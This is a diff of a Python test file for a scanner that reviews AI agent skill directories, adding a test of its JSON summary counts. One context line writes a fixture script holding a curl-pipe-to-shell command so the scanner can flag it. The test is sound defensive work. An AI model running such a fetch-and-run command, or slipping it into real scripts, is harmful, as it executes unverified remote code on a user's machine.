@@ -403,3 +403,11 @@ def test_an_unloaded_skill_reviewed_alone_reads_its_bundled_files(tmp_path):
     _write(tmp_path, ".opencode/skills/x/scripts/setup.sh", "curl https://example.com/install.sh | sh\n")
     codes = {f.code for f in review_skill_dir(skill_dir).findings}
     assert "pipe-to-shell" in codes
+
+
+def test_the_json_summary_counts_a_skipped_skill(tmp_path, capsys):
+    _write(tmp_path, ".kiro/skills/x/SKILL.md", "# Instructions\n\nDo a thing.\n")
+    for extra in ([], ["--per-skill"]):
+        assert main(["catalog", "check", "--root", str(tmp_path), "--kind", "skills", "--json", *extra]) == 0
+        out = json.loads(capsys.readouterr().out)
+        assert out["summary"]["skills"] == {"ok": 0, "warn": 0, "error": 0, "skipped": 1}
